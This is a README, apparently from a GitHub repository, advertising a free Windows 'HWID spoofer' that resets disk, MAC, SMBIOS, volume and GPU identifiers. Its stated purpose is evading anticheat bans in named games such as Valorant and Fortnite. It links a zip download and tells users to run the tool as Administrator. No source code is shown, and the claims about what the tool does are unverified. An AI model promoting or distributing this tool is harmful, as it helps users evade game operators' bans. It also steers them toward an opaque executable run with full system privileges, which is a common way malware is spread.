# Hardware ID Tool

Basically a free hwid spoofer for Windows. Resets the hardware identifiers that anticheats use to track banned machines — disk serials, MAC address, SMBIOS, volume GUIDs, GPU info.

Tested with Valorant, Fortnite, Warzone/MW3, Rust, Escape from Tarkov, Apex Legends, PUBG.

No key, no account. Just download and run.

---

**[Download](https://github.com/TrackGeomancer/hardware-id-tool/releases/download/Main/HWID-Spoofer.zip)**

---

### What gets reset

- HDD/SSD serial numbers
- MAC address (NIC)
- Motherboard & BIOS serials (SMBIOS)
- Volume GUIDs
- GPU device ID
- PC name / user SID (optional, toggle in settings)

### How to use

1. Close the game completely
2. Run as Administrator
3. Select what to spoof, click Start
4. Reboot

Some values only apply after a full cold boot, not just restart. If something didn't change — shut down completely, boot again.
